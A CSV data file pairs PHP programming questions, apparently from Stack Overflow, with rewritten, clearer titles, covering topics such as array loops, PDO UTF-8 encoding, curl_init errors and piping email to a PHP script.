originalTitle,body,reformulatedTitle
Loop through an array php, I have this array... how do you print each of the filepath and filename? What is the best way to do this? <code>  Array ( [0] => Array ( [fid] => 14 [list] => 1 [data] => Array ( [alt] => [title] => ) [uid] => 1 [filename] => trucks_10785.jpg [filepath] => sites/default/files/trucks_10785.jpg [filemime] => image/jpeg [filesize] => 143648 [status] => 1 [timestamp] => 1291424171 [nid] => 8 ) [1] => Array ( [fid] => 19 [list] => 1 [data] => Array ( [alt] => [title] => ) [uid] => 1 [filename] => school.jpg [filepath] => sites/default/files/school.jpg [filemime] => image/jpeg [filesize] => 115355 [status] => 1 [timestamp] => 1292029563 [nid] => 8 ) [2] => Array ( [fid] => 20 [list] => 1 [data] => Array ( [alt] => [title] => ) [uid] => 1 [filename] => Life_is_wonderful_by_iNeedChemicalX.jpg [filepath] => sites/default/files/Life_is_wonderful_by_iNeedChemicalX_0.jpg [filemime] => image/jpeg [filesize] => 82580 [status] => 1 [timestamp] => 1292029572 [nid] => 8 ) [3] => Array ( [fid] => 21 [list] => 1 [data] => Array ( [alt] => [title] => ) [uid] => 1 [filename] => school_rural.jpg [filepath] => sites/default/files/school_rural.jpg [filemime] => image/jpeg [filesize] => 375088 [status] => 1 [timestamp] => 1292029582 [nid] => 8 ) ),What is the best way to loop through this array in PHP?
PHP - Fetch current domain and not base domain," We are running one Magento install over multiple domains and are using a script to fetch information from the database to help users filter the products.In our coding we have the $_SERVER function calling the store which seems to be store 1 (which is on domain 1), I was wondering what I would need to change to fetch the information from store 2 (which is on domain 2). <code> ",Magento - Fetch current domain and not base domain
users time and date in php," I want to be able to get the time of the person using the PHP script. I don't know what time zone they will be in, etc.Is there not a way of just saying 'get the time of the user' rather than setting timezones? <code> ",Determining the user's time and date in PHP
pdo+mysql and utf-8 encoding problem;," I use the PDO library with a MySQL database in PHP, but if I insert any data encoded in UTF-8, like Arabic words, its inserted into the database, but as ?????????.In my own framework, after I create the PDO connection, I send two queries SET NAMES utf8 and SET CHARACTER SET utf8. It still doesnt work.Example: Workaround: Use the json_encode function to convert data before inserting it to the database, and use json_decode to decode it after fetching. This is how I do it now. <code>  loadclass('PDO', array( sprintf( 'mysql:host=%s;port=%s;dbname=%s', confitem('database', 'host'), confitem('database', 'port'), confitem('database', 'name') ), confitem('database', 'username'), confitem('database', 'password'), array('PDO::ATTR_PERSISTENT' => confitem('database', 'pconnect'))));$this->query('SET NAMES ' . confitem('database', 'charset'));$this->query('SET CHARACTER SET ' . confitem('database', 'charset'));",PDO + MySQL and broken UTF-8 encoding
curl_init() function not working," I try PHP Post Request inside a POST Request thinking it might be useful for me. My code is given below: from the index.php file and index2.php is another file in the same directory and when I open the page I get the following error in my error.log file: What I want to do is to have a reservation form that send post request. Then I want to process post values and send again the post request to paypal. <code>  $sub_req_url = ""http://localhost/index1.php"";$ch = curl_init($sub_req_url);$encoded = '';// include GET as well as POST variables; your needs may vary.foreach($_GET as $name => $value) { $encoded .= urlencode($name).'='.urlencode($value).'&';}foreach($_POST as $name => $value) { $encoded .= urlencode($name).'='.urlencode($value).'&';}// chop off last ampersand$encoded = substr($encoded, 0, strlen($encoded)-1);curl_setopt($ch, CURLOPT_POSTFIELDS, $encoded);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_POST, 1);curl_exec($ch);curl_close($ch); [Sat Dec 18 15:24:53 2010] [error] [client ::1] PHP Fatal error: Call to undefined function curl_init() in /var/www/testing1/index.php on line 5",PHP Fatal error: Call to undefined function curl_init()
create multidimensional array in loop," I am trying to create an array like this in a loop: with this code but when loop completes my array looks like this: <code>  $dataPoints = array( array('x' => 4321, 'y' => 2364), array('x' => 3452, 'y' => 4566), array('x' => 1245, 'y' => 3452), array('x' => 700, 'y' => 900), array('x' => 900, 'y' => 700)); $dataPoints = array(); $brands = array(""COCACOLA"",""DellChannel"",""ebayfans"",""google"", ""microsoft"",""nikeplus"",""amazon""); foreach ($brands as $value) { $resp = GetTwitter($value); $dataPoints = array( ""x""=>$resp['friends_count'], ""y""=>$resp['statuses_count']);} Array ( [x] => 24 [y] => 819 ) ",Create a multidimensional array in a loop
json indentation in php," I want to echo JSON in with indentation in PHP, just like echo ""<pre>""; indents an array.Is there any function by which I can indent JSON like this? <code> ",JSON indentation in PHP
PHP - remove a string from the beginning of a string," I have a string that looks like this: How can I remove the first bla_; but only if it's found at the beginning of the string?With str_replace(), it removes all bla_'s. <code>  $str = ""bla_string_bla_bla_bla"";",Remove a string from the beginning of a string
Can I programatically determine if a PNG is animated?," I have PNG (as well as JPEG) images uploaded to my site.They should be static (i.e. one frame).There is such thing as APNG.(it will be animated in Firefox).According to the Wikipedia article... APNG hides the subsequent frames in PNG ancillary chunks in such a way that APNG-unaware applications would ignore them, but there are otherwise no changes to the format to allow software to distinguish between animated and non-animated images.Does this mean it is impossible to determine if a PNG is animated with code?If it is possible, can you please point me in the right direction PHP wise (GD, ImageMagick)? <code> ",Can I programmatically determine if a PNG is animated?
'set' in C++ (C plus plus) is the same as the '?' in PHP," What's the equivalent function in PHP for C plus plus ""set"" (""Sets are a kind of associative containers that stores unique elements, and in which the elements themselves are the keys."")? <code> ",Equivalent of std::set in PHP?
'set' in C++ is the same as the '?' in PHP," What's the equivalent function in PHP for C plus plus ""set"" (""Sets are a kind of associative containers that stores unique elements, and in which the elements themselves are the keys."")? <code> ",Equivalent of std::set in PHP?
PHP5. Two ways of declaring an array as a class member.," When declaring an array as a class member, which way should it be done? or Which one is better in terms of good practices and performance? What would you recommend? <code>  class Test1 { private $paths = array(); public function __construct() { // some code here }} class Test2 { private $paths; public function __construct() { $this->paths = array(); // some code here }}",PHP5. Two ways of declaring an array as a class member
PHP - Shell script ...PLEASE HELP!!!," Ok, I am trying to create an email logger, that uses a PHP shell script. I have set up CPanel to pipe emails to my script. I am sure this is all configured properly. However I am having problems with the script, well any script for that matter when running it from the shell.here is an example. Real simple, right? Read from STDIN and write to a file...I thought something was wrong, not able to read STDIN for some reason. Hosting provider allows it, allow_url_open and allow_url_include are both on.When executing the script via SSH I get the following error:Could not open input file: qSo once again I thought that was the script telling me, that is could not read from STDINSo I tried just a simple script. Same thing:Could not open input file: qSo it appears that the PHP program is telling me it is unable to open the script? The script is located in $HOME/mail/forward (CHMOD 755) and the script itself is CHMOD 755, as well the file mail.txt is CHMOD 755I am really stumped on this. <code>  #!/usr/local/bin/php q<?php/* Read the message from STDIN */$fd = fopen(""php://stdin"", ""r"");$email = """"; // This will be the variable holding the data.while (!feof($fd)) {$email .= fread($fd, 1024);}fclose($fd);/* Saves the data into a file */$fdw = fopen(""mail.txt"", ""w+"");fwrite($fdw, $email);fclose($fdw);/* Script End */?> #!/usr/local/bin/php q<?phpecho 'Hello World';?>","Problems with a PHP shell script: ""Could not open input file"""
is php language c++?," Ok: I edited my question: I heard somewhere that php language is written in C.So what happens for example when you run a function in php such as date(""Ymd""); or file_get_contents(""file.txt"");? Does it translate that code to C and request to server, or does php do it?And if it does translate it and request, that means basically it is C? <code> ",Is the PHP language resultantly C?
is php language C?," Ok: I edited my question: I heard somewhere that php language is written in C.So what happens for example when you run a function in php such as date(""Ymd""); or file_get_contents(""file.txt"");? Does it translate that code to C and request to server, or does php do it?And if it does translate it and request, that means basically it is C? <code> ",Is the PHP language resultantly C?
